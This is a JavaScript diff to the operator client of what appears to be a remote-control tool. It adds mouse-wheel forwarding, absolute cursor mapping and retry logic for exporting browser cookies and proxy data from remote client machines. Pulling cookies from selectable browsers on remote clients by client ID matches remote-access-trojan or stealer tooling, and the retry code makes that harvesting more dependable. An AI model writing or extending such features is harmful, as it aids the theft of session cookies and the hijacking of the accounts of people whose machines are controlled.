@@ -5,6 +5,7 @@
   const CONTROL_TYPES = {
     mouseMove: "mouse_move",
     mouseClick: "mouse_click",
+    mouseScroll: "mouse_scroll",
     keypress: "keypress",
     text: "text"
   };
@@ -97,6 +98,8 @@
     remoteCurrentPath: ".",
     pendingDownload: null,
     pendingAppLaunch: null,
+    pendingExport: null,
+    pendingExportRetries: 0,
     isConnected: false,
     e2eeContext: null,
     cursorX: 0,
@@ -919,6 +922,33 @@
       metrics.offsetY + (state.cursorY / metrics.videoHeight) * metrics.renderHeight;
     dom.cursorOverlay.style.left = `${Math.round(x)}px`;
     dom.cursorOverlay.style.top = `${Math.round(y)}px`;
+  }
+
+  function setCursorFromAbsolute(event) {
+    const metrics = getVideoMetrics();
+    if (!metrics) {
+      return;
+    }
+    const rawX = event.clientX - metrics.rect.left - metrics.offsetX;
+    const rawY = event.clientY - metrics.rect.top - metrics.offsetY;
+    const clampedX = clamp(rawX, 0, metrics.renderWidth - 1);
+    const clampedY = clamp(rawY, 0, metrics.renderHeight - 1);
+    const scaledX = Math.round((clampedX / metrics.renderWidth) * metrics.videoWidth);
+    const scaledY = Math.round((clampedY / metrics.renderHeight) * metrics.videoHeight);
+    state.cursorX = clamp(scaledX, 0, metrics.videoWidth - 1);
+    state.cursorY = clamp(scaledY, 0, metrics.videoHeight - 1);
+    state.cursorInitialized = true;
+    updateCursorOverlayPosition();
+  }
+
+  function normalizeWheelDelta(value, mode) {
+    let scaled = Number(value) || 0;
+    if (mode === 1) {
+      scaled *= 16;
+    } else if (mode === 2) {
+      scaled *= 200;
+    }
+    return scaled;
   }
 
   function mapMouseButton(button) {
@@ -1744,6 +1774,7 @@
         startStatsMonitor();
         drainCookieQueue();
         drainProxyQueue();
+        void retryPendingExport();
         setRemoteCursorVisibility(state.remoteCursorVisible, true);
         if (state.storageAutostart && !dom.storageDrawer.classList.contains("open")) {
           toggleStorage(true);
@@ -1795,7 +1826,8 @@
       if (state.softLock) {
         return;
       }
-      applyRelativeMove(event);
+      setCursorFromAbsolute(event);
+      scheduleMoveSend();
     });
 
     dom.screenFrame.addEventListener("mouseenter", (event) => {
@@ -1819,6 +1851,9 @@
         return;
       }
       event.preventDefault();
+      if (!state.cursorLocked && !state.softLock) {
+        setCursorFromAbsolute(event);
+      }
       setSoftLock(true);
       if (!state.cursorInitialized) {
         updateCursorBounds();
@@ -1843,6 +1878,41 @@
         source_height: sourceHeight || undefined
       });
     });
+
+    dom.screenFrame.addEventListener(
+      "wheel",
+      (event) => {
+        if (!state.controlEnabled || !state.isConnected) {
+          return;
+        }
+        event.preventDefault();
+        if (!state.cursorLocked && !state.softLock) {
+          setCursorFromAbsolute(event);
+        }
+        if (!state.cursorInitialized) {
+          updateCursorBounds();
+        }
+        const coords = getCursorPosition();
+        if (!coords) {
+          return;
+        }
+        const metrics = getVideoMetrics();
+        const sourceWidth = metrics ? metrics.videoWidth : null;
+        const sourceHeight = metrics ? metrics.videoHeight : null;
+        const deltaX = normalizeWheelDelta(event.deltaX, event.deltaMode);
+        const deltaY = normalizeWheelDelta(event.deltaY, event.deltaMode);
+        void sendControl({
+          type: CONTROL_TYPES.mouseScroll,
+          x: coords.x,
+          y: coords.y,
+          delta_x: Math.round(deltaX),
+          delta_y: Math.round(deltaY),
+          source_width: sourceWidth || undefined,
+          source_height: sourceHeight || undefined
+        });
+      },
+      { passive: false }
+    );
 
     dom.screenFrame.addEventListener("auxclick", (event) => {
       if (!state.controlEnabled || !state.isConnected) {
@@ -2068,7 +2138,7 @@
     return `proxy_${safe}.txt`;
   }
 
-  async function requestCookieExport(browsers, filenameOverride) {
+  async function requestCookieExport(browsers, filenameOverride, retry = false) {
     if (!ensureChannelOpen()) {
       setCookieStatus("Data channel not ready", "warn");
       return;
@@ -2076,6 +2146,14 @@
     const normalized = normalizeCookieList(browsers);
     const label = normalized.length ? normalized.join(", ") : "all";
     const filename = filenameOverride || buildCookieFilename(normalized);
+    if (!retry) {
+      state.pendingExport = {
+        kind: "cookies",
+        browsers: normalized,
+        filename
+      };
+      state.pendingExportRetries = 0;
+    }
     state.pendingDownload = {
       name: filename,
       kind: "cookies"
@@ -2095,12 +2173,20 @@
     }
   }
 
-  async function requestProxyExport(clientId, filenameOverride) {
+  async function requestProxyExport(clientId, filenameOverride, retry = false) {
     if (!ensureChannelOpen()) {
       setDownloadStatus("Data channel not ready", "warn");
       return;
     }
     const filename = filenameOverride || buildProxyFilename(clientId);
+    if (!retry) {
+      state.pendingExport = {
+        kind: "proxy",
+        clientId,
+        filename
+      };
+      state.pendingExportRetries = 0;
+    }
     state.pendingDownload = {
       name: filename,
       kind: "proxy"
@@ -2328,6 +2414,13 @@
         setCookieStatus(message, "bad");
       }
       setDownloadStatus(message, "bad");
+      if (
+        state.pendingExport &&
+        (state.pendingDownload.kind === "cookies" || state.pendingDownload.kind === "proxy")
+      ) {
+        state.pendingExport = null;
+        state.pendingExportRetries = 0;
+      }
       state.pendingDownload = null;
       return;
     }
@@ -2402,6 +2495,7 @@
       return;
     }
     const isCookieDownload = state.pendingDownload.kind === "cookies";
+    const completedKind = state.pendingDownload.kind;
     try {
       saveBase64File(message, state.pendingDownload.name);
       addDownloadEntry(state.pendingDownload.name);
@@ -2415,7 +2509,39 @@
         setCookieStatus("Failed to save file", "bad");
       }
     } finally {
+      if (
+        state.pendingExport &&
+        (completedKind === "cookies" || completedKind === "proxy")
+      ) {
+        state.pendingExport = null;
+        state.pendingExportRetries = 0;
+      }
       state.pendingDownload = null;
+    }
+  }
+
+  async function retryPendingExport() {
+    if (!state.pendingExport || !ensureChannelOpen()) {
+      return;
+    }
+    if (state.pendingExportRetries >= 1) {
+      return;
+    }
+    state.pendingExportRetries += 1;
+    if (state.pendingExport.kind === "cookies") {
+      await requestCookieExport(
+        state.pendingExport.browsers || [],
+        state.pendingExport.filename || null,
+        true
+      );
+      return;
+    }
+    if (state.pendingExport.kind === "proxy") {
+      await requestProxyExport(
+        state.pendingExport.clientId || null,
+        state.pendingExport.filename || null,
+        true
+      );
     }
   }
 
